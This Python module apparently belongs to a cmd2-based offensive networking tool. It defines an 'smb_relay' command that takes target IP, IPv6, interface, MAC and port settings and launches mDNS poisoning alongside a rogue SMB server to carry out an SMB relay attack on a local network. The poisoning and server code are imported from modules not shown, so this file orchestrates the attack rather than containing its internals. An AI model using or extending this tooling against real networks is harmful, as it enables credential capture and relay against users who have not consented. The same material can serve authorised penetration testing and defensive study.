from typing import final
from cmd2.command_definition import with_default_category
from cmd2 import CommandSet, with_default_category, Cmd2ArgumentParser, with_argparser
import argparse
from .servers import SmbServer
from .Poison import MDNS
from multiprocessing import Process
from threading import Thread


@with_default_category("Relay Attacks")
class SmbRelay(CommandSet):
    def __init__(self) -> None:
        super().__init__()

    @property
    def stop_attack(self):
        return self._stop_attack

    def config_poison_and_server(self, mdns_poisoner, smbserver):
        mdns_thread = Thread(target=mdns_poisoner.start_mdns_poisoning)
        smbserver_thread = Thread(target=smbserver.start_smbserver)
        mdns_thread.daemon = True
        smbserver_thread.daemon = True

        mdns_thread.start()
        smbserver_thread.start()

        smbserver_thread.join()

        """
        mdns_process = multiprocessing.Process(
            target=mdns_poisoner.start_mdns_poisoning
        )
        mdns_process.start()

        smbserver_process = multiprocessing.Process(target=smbserver.start_smbserver)
        smbserver_process.start()

        smbserver_process.join()
        mdns_process.join()
        """

    argParser = Cmd2ArgumentParser(
        description="""Tool to perform the smb_relay attack attack"""
    )
    argParser.add_argument(
        "-SS",
        "--show_settable",
        action="store_true",
        help="Show Settable variables for this command",
    )

    @with_argparser(argParser)
    def do_smb_relay(self, args: argparse.Namespace) -> None:
        mdns_poisoner = MDNS(
            self._cmd.IP_TARGET,
            self._cmd.IPV6,
            self._cmd.MAC_ADDRESS,
            self._cmd.INTERFACE,
        )

        smbserver = SmbServer(self._cmd.LHOST, self._cmd.LPORT, self._cmd.stdout)

        self._cmd.logger.info(
            f"""Starting smb relay attack using ip: {self._cmd.IP_TARGET} ipv6:{self._cmd.IPV6}
            interface: {self._cmd.INTERFACE} mac_address:{self._cmd.MAC_ADDRESS} lport:{self._cmd.LPORT}"""
        )

        settable_variables_required = {
            "IP_TARGET": self._cmd.IP_TARGET,
            "IPV6": self._cmd.IPV6,
            "INTERFACE": self._cmd.INTERFACE,
            "MAC_ADDRESS": self._cmd.MAC_ADDRESS,
            "LPORT": self._cmd.LPORT,
        }
        if args.show_settable:
            self._cmd.show_settable_variables_necessary(settable_variables_required)
        elif self._cmd.check_settable_variables_value(settable_variables_required):

            attack = Process(
                target=self.config_poison_and_server, args=(mdns_poisoner, smbserver)
            )
            attack.start()
            try:
                attack.join()
            except KeyboardInterrupt:
                attack.terminate()
                attack.join()
                self._cmd.pwarning("Exiting...")

            """
            try:
                mdns_process = multiprocessing.Process(
                    target=mdns_poisoner.start_mdns_poisoning
                )
                mdns_process.start()

                smbserver_process = multiprocessing.Process(
                    target=smbserver.start_smbserver
                )
                smbserver_process.start()

                smbserver_process.join()
                mdns_process.join()
            except KeyboardInterrupt:
                smbserver_process.terminate()
                mdns_process.terminate()
                mdns_process.join()
                smbserver_process.join()
                self._cmd.pwarning("Exiting...")
            """
